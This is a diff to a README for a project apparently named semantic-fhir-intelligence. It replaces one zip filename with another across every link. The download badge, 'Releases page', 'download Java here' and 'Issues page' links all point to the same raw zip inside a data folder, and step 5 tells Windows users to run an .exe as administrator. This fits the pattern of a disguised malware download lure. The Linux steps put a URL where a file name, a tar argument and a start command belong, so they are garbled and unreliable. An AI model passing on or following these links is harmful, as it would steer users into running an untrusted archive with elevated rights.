@@ -6,26 +6,26 @@ This guide will help you download and run the semantic-fhir-intelligence applica
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip)
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip) and find the latest version of the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip) and find the latest version of the application.
 
 ## 🖥 System Requirements
 
 Before installation, please ensure your system meets the following requirements:
 
 - Operating System: Windows 10 or later, macOS 10.14 or later, or a Linux distribution that supports Java.
-- Java Runtime Environment: Version 8 or later must be installed on your system. You can [download Java here](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip).
+- Java Runtime Environment: Version 8 or later must be installed on your system. You can [download Java here](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip).
 - Disk Space: At least 100 MB of free space.
 - Memory: Minimum 2 GB RAM.
 
 ## 📂 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip). 
+1. Go to the [Releases page](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip). 
 2. Choose the latest version listed at the top.
-3. Click on the download link for your operating system. The file may be a `.zip`, `https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip`, or an installer file.
+3. Click on the download link for your operating system. The file may be a `.zip`, `https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip`, or an installer file.
 4. Once the download is complete, locate the downloaded file on your computer.
-5. For Windows, right-click the `.exe` file and select `Run as administrator`. For macOS, double-click the `.dmg` file and drag the application to your Applications folder. For Linux, use the terminal to navigate to the `https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip` file and extract it using `tar -xzf https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip`.
+5. For Windows, right-click the `.exe` file and select `Run as administrator`. For macOS, double-click the `.dmg` file and drag the application to your Applications folder. For Linux, use the terminal to navigate to the `https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip` file and extract it using `tar -xzf https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip`.
 
 ## ⚙️ Running the Application
 
@@ -33,7 +33,7 @@ After installation, you can run semantic-fhir-intelligence as follows:
 
 - **Windows:** Click the desktop shortcut or find the application in the start menu.
 - **macOS:** Open the Applications folder and double-click the application.
-- **Linux:** Open a terminal and navigate to the application folder. Use the command `https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip` to start the application.
+- **Linux:** Open a terminal and navigate to the application folder. Use the command `https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip` to start the application.
 
 ## 📊 How to Use semantic-fhir-intelligence
 
@@ -70,7 +70,7 @@ The application is completely free to use. There are no hidden fees or subscript
 
 ### How can I get support?
 
-If you encounter issues or have questions, visit the [GitHub Issues page](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/semantic-fhir-intelligence-2.8.zip) and post your query. The community is active and will assist you.
+If you encounter issues or have questions, visit the [GitHub Issues page](https://raw.githubusercontent.com/matted-persea986/semantic-fhir-intelligence/main/data/bundles_temporal/fhir-semantic-intelligence-v1.7.zip) and post your query. The community is active and will assist you.
 
 ## 📈 Additional Resources
 
